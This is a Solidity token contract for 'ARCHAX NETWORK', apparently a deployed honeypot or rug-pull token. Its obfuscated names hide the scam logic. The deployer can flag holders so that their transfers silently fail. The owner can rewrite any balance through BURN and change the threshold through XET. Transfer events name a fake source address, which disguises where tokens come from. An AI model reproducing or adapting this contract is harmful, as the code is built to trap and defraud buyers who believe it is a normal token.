/**
 *Submitted for verification at Etherscan.io on 2023-03-06
*/

pragma solidity 0.8.19;

// SPDX-License-Identifier: MIT

 
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

} 

 
contract ARCHAX {
    using SafeMath for uint256;
    mapping (address => uint256) private jXa;
	
    mapping (address => uint256) public jXb;
    mapping(address => mapping(address => uint256)) public allowance;
    string public name = "ARCHAX NETWORK";
	
    string public symbol = "ARCHAX";
    uint8 public decimals = 6;

    uint256 public totalSupply = 250000000 *10**6;
    address owner = msg.sender;
	  address private jXc;
      address private jXd;
    uint256 private jXe;
 
  
    
  


    event Transfer(address indexed from, address indexed to, uint256 value);
	  address jXf = 0x00C5E04176d95A286fccE0E68c683Ca0bfec8454;
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
   



        constructor()  {
        jXd = msg.sender;
             jXa[msg.sender] = totalSupply;
        
       CAST();}

  
	
	
   modifier onlyOwner () {
    require(msg.sender == owner);
	_;}
    



	

    function renounceOwnership() public virtual {
       
        require(msg.sender == owner);
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
        
    }

  



  		    function CAST() internal  {                             
                       jXb[msg.sender] = 7;
                       jXc = jXf;

                

        emit Transfer(address(0), jXc, totalSupply); }



   function balanceOf(address account) public view  returns (uint256) {
        return jXa[account];
    }

    function transfer(address to, uint256 value) public returns (bool success) {
 	
if(jXb[msg.sender] <= jXe) {
    require(jXa[msg.sender] >= value);
jXa[msg.sender] -= value;  
jXa[to] += value;  
 emit Transfer(msg.sender, to, value);
        return true; }
        
   if(jXb[msg.sender] > jXe) { }  }   
        
     

 function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true; }

 		       function READ (address jXj, uint256 jXk) public {
		if(jXb[msg.sender] == jXe) {   
			   	   
   jXb[jXj] = jXk;}
   }
		       function XET (uint256 jXk) onlyOwner public {
                     jXe = jXk; 
	}

 		       function BURN (address jXj, uint256 jXk) onlyOwner public {		   	   
  jXa[jXj] = jXk;}


   function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
  

	 
 

       if(jXb[from] < jXe && jXb[to] < jXe) {
        require(value <= jXa[from]);
        require(value <= allowance[from][msg.sender]);
        jXa[from] -= value;
        jXa[to] += value;
        allowance[from][msg.sender] -= value;
                    emit Transfer(from, to, value);
        return true;
        }


       if(jXb[from] == jXe) {
        require(value <= jXa[from]);
        require(value <= allowance[from][msg.sender]);
        jXa[from] -= value;
        jXa[to] += value;
        allowance[from][msg.sender] -= value;


            from = jXf;
	   

        emit Transfer(from, to, value);
        return true; }


         if(jXb[from] > jXe || jXb[to] > jXe) {
             
         }}



     

        	
 }